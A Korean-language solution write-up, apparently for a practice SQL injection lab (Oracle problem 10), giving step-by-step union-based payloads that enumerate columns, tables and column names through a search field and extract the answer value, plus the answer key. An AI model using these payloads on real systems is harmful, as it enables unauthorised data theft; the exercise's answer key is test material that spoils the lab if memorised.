@@ -1,0 +1,68 @@
+===============================
+
+* SQL Injection Oracle 문제 10번
+
+===============================
+
+1. 풀이과정
+ 1) 쿼리문 유추
+
+select 컬럼들 from 주소 where 읍면동 like '% %'
+
+ 2) 공격 포인트
+
+삼성동%' or 거짓
+select 컬럼들 from 주소 where 읍면동 like '%삼성동%' or 'j'='p %'
+ 
+검색어 : 삼성동%' or 'j'='p
+공격어 : 삼성동%' [공격구문] or 'j'='p
+
+ 3) Union 제약사항
+
+컬럼수 찾기 1) order by 2) null 개수
+1)
+삼성동%' order by 1
+삼성동%' order by 5--     -> 결과나옴
+삼성동%' order by 6--     -> 결과안나옴
+따라서 개수는 테이블 개수는 5개임.
+2)
+select 컬럼들 from 주소 where 읍면동 like '%삼성동%' union
+select null,null,null,null from dual where 'p%'='p%';
+
+null을 하나씩 추가해보면서 확인 - 5개에서 결과가 나옴
+검색어 :삼성동%' union select null,null,null,null,null from dual where 'p%'='p
+
+type 확인 'a'이나 1 등을 넣어 확인
+삼성동%' union select 'a','b','c','d','e' from dual where 'p%'='p
+
+삼성동%' union select table_name,'','','','' from user_tables where 'p%'='p
+
+ 4) 테이블명
+
+SQL_UNION_ANSWER
+select table_name from user_tables  - oracle
+
+검색어 : 삼성동%' union select table_name,'','','','' from user_tables where 'p%'='p
+
+ 5) 컬럼명
+
+SQL_UNION_ANSWER 테이블의 컬럼
+select column_name from user_tab_columns where table_name = 'SQL_UNION_ANSWER'
+
+검색어 :삼성동%' union select column_name,'','','','' from user_tab_columns where table_name = 'SQL_UNION_ANSWER' or 'j%'='p
+
+ANSWER_COLUMN	
+REG_ACCT_ID	
+REG_DT	
+UDT_ACCT_ID	
+UDT_DT
+
+
+ 6) 데이터 탈취
+
+(ANSWER_COLUMN)
+검색어 : 삼성동%' union select ANSWER_COLUMN,'','','','' from SQL_UNION_ANSWER where 'p%'='p
+
+2. 정답
+정답 : this_is_perfect_answer
+===============================
